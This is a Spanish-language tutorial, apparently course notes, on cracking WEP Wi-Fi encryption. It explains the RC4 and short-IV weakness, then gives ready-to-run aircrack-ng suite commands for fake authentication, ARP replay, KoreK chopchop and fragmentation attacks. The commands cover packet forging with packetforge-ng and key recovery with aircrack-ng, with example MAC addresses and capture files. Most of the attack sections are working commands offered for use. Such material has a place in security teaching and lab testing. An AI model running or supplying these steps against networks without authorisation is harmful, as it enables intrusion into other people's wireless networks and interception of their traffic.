# WEP Cracking

## Teoría

- Wep Equivalent Privacy.
- Cifrado viejo.
- Usa un algoritmo llamado **RC4**.
- Aún es usado en algunas redes.
- Puede ser crackeado con facilidad.

### Resumen

- Paso 1. Cliente cifra los datos usando una llave.
- Paso 2. El paquete cifrado viaja por el aire.
- Paso 3. El router decifra el paquete usando la llave.

**Descripción**

- Cada paquete es cifrado usando una stream con llave única.
- Es usado un vector de inicialización aleatorio (IV) para generar los key streams.
- El vector de inicialización tiene de longitud **sólo 24 bits**.
- IV + Key (password) = Key Stream.
- El IV es enviado en texto plano.

**Vía de explotación o vulnerabilidades**

- Los IV's se repetiran en redes ocupadas.
- Eso vuelve al sistema WEP vulnerable a ataques estadísticos.
- IV's repetidos pueden ser usados para ternerminar el key stream.
- Y eventualmente, romper el cifrado.

**Conclusión**

Para crackear el cifrado es necesario:
1. Capturar una gran cantidad de paquetes/IVs. (`airodump-ng`)
2. Analizar los IVs capturados y crackear la llave. (`aircrack-ng`)

## Fake Authentication Attack

**Caso | Problema**

- La red no cuenta con mucho tráfico.
- Tomará mucho tiempo capturar paquetes.

**Solución**

- Forzar al Access Point a generar nuevos IVs.

*Antes de considerar la solución se debe tener en cuenta el siguiente sub-problema.*

**Sub-Problema**

- Los APs sólo se comunican con clientes conectados.
  - No se puede comunicar con este.
  - No se puede inicializar el ataque.

**Solución**

- Asociarse al AP antes de ejecutar el ataque.

### Ejecución

*Primeramente es necesario ejecutar packet sniffing contra objetivo.*

```bash
aireplay-ng --fakeauth 0 -a <MAC Address de objetivo> -h <MAC Address de adaptador wireless> <interfaz en modo monitor>
aireplay-ng --fakeauth 0 -a F8:23:B2:B9:50:A8 -h 48:5D:60:2A:45:25 mon0
```

*Posteriormente se puede forzar al AP a generar nuevos IVs por diferentes métodos.*

## Packet Injection - ARP Request Reply Attack

### Procedimiento

- Esperar un paquete ARP.
- Capturarlo, y retransmitirlo.
- Esto causa que el AP produzca otro paquete con un nuevo IV.
- Continuar haciéndolo hasta tener los suficientes como para crackear la llave.

### Ejecución

```bash
aireplay-ng --arpreplay -b <MAC Address de objetivo> -h <MAC Address de adaptador wireless> <interfaz en modo monitor>
aireplay-ng --arpreplay -b F8:23:B2:B9:50:A8 -h 48:5D:60:2A:45:25 mon0

aircrack-ng <archivo .cap>
aircrack-ng arpreplay-01.cap
```

## Packet Injection - Korek Chopchop Attack

### Consideraciones

- Funcional con señales débiles.
- Más complejo a diferencia del ARP Request Reply.

### Procedimiento

1. Determinar el packet key stream.
2. Forjar un nuevo paquete
3. Inyectarlo en el tr{afico.

### Ejecución

1. Ejecutar packet sniffing contra objetivo.
2. Ejecutar Fake Auth.

```bash
aireplay-ng --chopchop -b <MAC Address de objetivo> -h <MAC Address de adaptador wireless> <interfaz en modo monitor>
aireplay-ng --chopchop -b F8:23:B2:B9:50:A8 -h 48:5D:60:2A:45:25 mon0

packetforge-ng -0 -a <MAC Address de objetivo> -h <MAC Address de adaptador wireless> -k <IP destino> -l <IP fuente> -y <archivo key stream (.xor)> -w <archivo forjado>
packetforge-ng -0 -a F8:23:B2:B9:50:A8 -h 48:5D:60:2A:45:25 -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-0824-110731.xor -w chopchop-forged-packet

aireplay-ng -2 -r <archivo forjado> <interfaz en modo monitor>
aireplay-ng -2 -r chopchop-forged-packet mon0

aircrack-ng <archivo .cap>
aircrack-ng chopchop-test-01.cap
```

## Packet Injection - Fragmentation Attack

El objetivo de este método es obtener 1500 bytes del PRGA (Pseudo Random Generation Algorithm), esto puede ser usado para forjar un nuevo paquete para posteriormente inyectarlo al tráfico para generar nuevos IV's.

1. Obtener PRGA.

```bash
aireplay-ng --fragment -b <MAC Address de objetivo> -h <MAC Address de adaptador wireless> <interfaz en modo monitor>
aireplay-ng --fragment -b F8:23:B2:B9:50:A8 -h 48:5D:60:2A:45:25 mon0
```

2. Forjar un nuevo paquete.

```bash
packetforge-ng -0 -a <MAC Address de objetivo> -h <MAC Address de adaptador wireless> -k 255.255.255.255 -l 255.255.255.255 -y <archivo key stream (.xor)> -w <archivo forjado>
packetforge-ng -0 -a F8:23:B2:B9:50:A8 -h 48:5D:60:2A:45:25 -k 255.255.255.255 -l 255.255.255.255 -y 1122out.xor -w chop-out
```

3. Inyectar el paquete forjado para generar nuevos IV's.

```bash
aireplay-ng -2 -r <archivo forjado> <interfaz en modo monitor>
aireplay-ng -2 -r chop-out mon0
```

4. Crackear llave

```bash
aircrack-ng <archivo .cap>
aircrack-ng chop-out-test-01.cap
```